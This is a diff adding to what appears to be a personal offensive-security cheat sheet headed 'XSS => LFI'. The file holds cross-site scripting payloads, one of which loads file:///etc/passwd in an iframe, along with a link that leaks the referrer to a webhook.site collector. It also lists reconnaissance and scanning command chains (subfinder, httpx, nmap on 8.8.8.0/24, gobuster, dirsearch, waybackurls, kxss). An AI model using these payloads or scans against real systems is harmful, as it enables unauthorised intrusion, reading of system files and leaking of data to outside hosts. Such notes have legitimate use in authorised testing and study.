@@ -22,3 +22,31 @@ XSS => LFI
 <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 "<zzz><style>@keyframes+x+{}</style><xss+style="animation-Name:+x"+onwebkitanimationstart="print()"></xss>
+
+<body>
+<a
+href="https://webhook.site/ffe26c64-71e0-482b-b295-a9b931686e60"
+referrerpolicy="unsafe-url"
+>
+click me
+</a>
+</body>
+
+subfinder -d example.com -all -cs > main.txt ; cat main.txt | cut -d "," -f 1 > domains.txt ; rm -rf main.txt
+cat domains.txt | httpx -title -wc -sc -cl -ct -location -web-server -asn -o alive-subdomains.txt
+
+cat domains.txt | httpx -sc -ip -server -title -wc 
+
+nmap -sV -Pn -O 8.8.8.0/24
+subfinder *.target.com >> Starget.txt
+Gobuster dir -u https://target.com -w /usr/share/wordlists/common.txt
+paramspider -d www.target.com >> Ptarget.txt
+cat Starget.txt | httpx -status-code
+cat Starget.txt | httpx >> 1live.txt
+cat Ptarget.txt | httpx >> 2live.txt
+
+waybackurls target.com >> WB-target.com.txt
+dirsearch -u https://target.com >> DS-target.com.txt
+Parampsider -l alld.com.txt
+Ran each .txt file with | httpx -status-code[].txt | httpx -mc 200 >> liveD.txt
+cat WB-target.com.txt | kxss
